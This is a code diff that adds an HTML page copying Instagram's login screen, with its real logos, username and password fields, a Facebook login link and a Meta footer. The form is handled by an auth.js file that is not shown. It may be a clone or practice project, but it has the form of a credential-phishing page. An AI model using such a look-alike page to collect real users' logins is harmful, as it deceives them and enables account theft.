@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="auth.css">
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/1024px-Instagram_icon.png">
+</head>
+<body>
+    <div class="auth-container">
+        <div class="auth-main">
+            <div class="auth-box">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram" class="auth-logo">
+                <form id="login-form" class="auth-form">
+                    <div class="input-group">
+                        <input type="text" id="login-username" placeholder="Phone number, username, or email" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" id="login-password" placeholder="Password" required>
+                        <span class="show-password" onclick="togglePassword('login-password')">Show</span>
+                    </div>
+                    <button type="submit" class="auth-btn" id="login-btn">Log in</button>
+                    
+                    <div class="divider">
+                        <div class="line"></div>
+                        <div class="or">OR</div>
+                        <div class="line"></div>
+                    </div>
+                    
+                    <a href="#" class="fb-login">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Facebook_logo_%28square%29.png/600px-Facebook_logo_%28square%29.png" alt="Facebook">
+                        Log in with Facebook
+                    </a>
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                </form>
+            </div>
+            
+            <div class="auth-box bottom-box">
+                <p>Don't have an account? <a href="signup.html" class="auth-link">Sign up</a></p>
+            </div>
+            
+            <div class="get-app">
+                <p>Get the app.</p>
+                <div class="app-stores">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yq/r/Yfc020c8z20.png" alt="Get it on Google Play">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yv/r/1-tb4ZcWwR3.png" alt="Get it from Microsoft">
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="auth-footer">
+        <div class="footer-links">
+            <a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a> <a href="#">Help</a> <a href="#">API</a> <a href="#">Privacy</a> <a href="#">Terms</a> <a href="#">Locations</a> <a href="#">Instagram Lite</a> <a href="#">Threads</a> <a href="#">Contact Uploading & Non-Users</a> <a href="#">Meta Verified</a>
+        </div>
+        <div class="footer-copyright">
+            <select>
+                <option>English</option>
+            </select>
+            <span>&copy; 2026 Instagram from Meta</span>
+        </div>
+    </footer>
+    <script src="auth.js"></script>
+</body>
+</html>
